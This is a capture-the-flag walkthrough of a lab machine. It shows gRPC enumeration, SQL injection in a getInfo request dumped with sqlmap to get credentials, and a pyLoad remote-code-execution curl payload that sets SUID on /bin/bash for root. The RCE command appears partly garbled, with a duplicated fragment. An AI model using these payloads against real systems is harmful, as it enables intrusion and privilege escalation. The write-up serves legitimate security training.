# Recon

All-tcp scan:

```sh
> nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.214 -Pn
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```
Detailed scan:

```sh
 > nmap -p 22,50051 -sVC --min-rate 10000 -oA scans/nmap-tcpdetail 10.10.11.214 -Pn
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
```

Sadly, it didn't yield any interesting data. Let's try to connect to it.

After a lot of tinkering and googling this command finally yielded something:

```sh
> ./grpcurl -plaintext 10.10.11.214:50051 describe
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

# Shell as user

To be able to use api easily, we can use following command:

```sh
./grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:43575/
```

Then, we can see that we have following options:  
- create user  
- login  
- get user info  

Login and create was tested against some common sql injection 
payloads, but with no result. I thought that maybe there IDOR
vulnerablility for id field, but it seems there is SQLi instead,
with following request:

```req
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: localhost:43575
Content-Length: 192
sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: tsTeJO7dEmW6K5AcUlKvDw8aBfNTQzRd95ai-ByoV0o
sec-ch-ua-platform: "Linux"
Origin: http://localhost:43575
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:43575/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=tsTeJO7dEmW6K5AcUlKvDw8aBfNTQzRd95ai-ByoV0o
Connection: close

{
  "metadata":[
    {
      "name":"token",
      "value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
      .eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NTQ4MzI4M30
      .1fL_aO451Xj4RtrQC685MZ-xPGvcYSpQvMo-WgirOG0"
      }
    ],
    "data":[{"id":"790"}]}
```

Using sqlmap on this request:

```sh
> sqlmap -r info.req --batch --threads 10 --tables
+----------+
| accounts |
| messages |
+----------+
> sqlmap -r info.req --batch --threads 10 -T accounts --dump
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
| test                   | test     |
+------------------------+----------+
```

We can now ssh as user sau.

User flag:
```
d89**************************eae
```

# Shell as root

Running linpeas, we can see two interesting things.
There is pyload application run by root:

```
root    /usr/bin/python3 /usr/local/bin/pyload
```

Scanning internal network, there is port 8000 nad 9666, which leads to pyload site:

```bash
> (netstat -punta || ss --ntpu)
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp        0      0 10.10.11.214:22         10.10.14.12:52294       ESTABLISHED -
tcp        0    612 10.10.11.214:22         10.10.14.12:49264       ESTABLISHED -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -
tcp6       0      0 10.10.11.214:50051      10.10.14.12:43086       ESTABLISHED -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Simple google for pyload vulnerabilities leads us to following rce exploit:

```bash
> curl -i -s -k -X $'POST' \
    --data-binary  \
      $'jk=pyimport%20os;os.system( \
          \"chmod%20%2Bs%20%2Fbin%2Fbash\"); \
          f=function%20f2(){}; \
          &package=xxx&crypted=AAAA&&passwords=aaaa' \
      $'http://localhost:8000/flash/addcrypted2'asswords=aaaa' \
      $'http://localhost:8000/flash/addcrypted2'
> /bin/bash -p
```


After running commands above, we get root access.

Root flag:
```
866**************************916
```
